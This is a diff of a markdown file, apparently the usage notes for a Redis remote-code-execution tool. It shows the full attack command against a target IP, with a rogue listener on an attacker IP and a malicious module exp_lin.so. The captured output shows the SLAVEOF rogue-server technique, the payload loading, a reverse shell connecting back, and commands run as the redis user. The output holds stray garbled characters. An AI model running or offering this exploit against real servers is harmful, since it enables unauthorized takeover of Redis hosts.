@@ -12,25 +12,28 @@
 `python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so`
 
 ```
-redis_server: 10.10.20.166
-
-attack_ip: 192.168.2.18
-
 python redis-rce.py -r 10.10.20.166 -p 6379 -L 192.168.2.18 -f exp_lin.so
 test
 [*] Connecting to  10.10.20.166:6379...
 [*] Listening on 192.168.2.18:21000
 [*] Sending SLAVEOF command to server
-Accepted connection from 192.168.2.18:20499
+Accepted connection from 192.168.2.18:3147
 [*] Setting filename
 [*] Tring to run payload
 Accepted connection from 192.168.2.18:21000
 [*] Closing rogue server...
 Received backconnect, use exit to exit...
 $
+葝?
 $ id
-€嵢uid=100(redis) gid=101(redis) groups=101(redis),101(redis)
+8嵢uid=100(redis) gid=101(redis) groups=101(redis),101(redis)
+$ pwd
+皪?/tmp
+$ ls
+貙?exp_lin.so
+exp_osx.so
 $
+
 
 ```
 
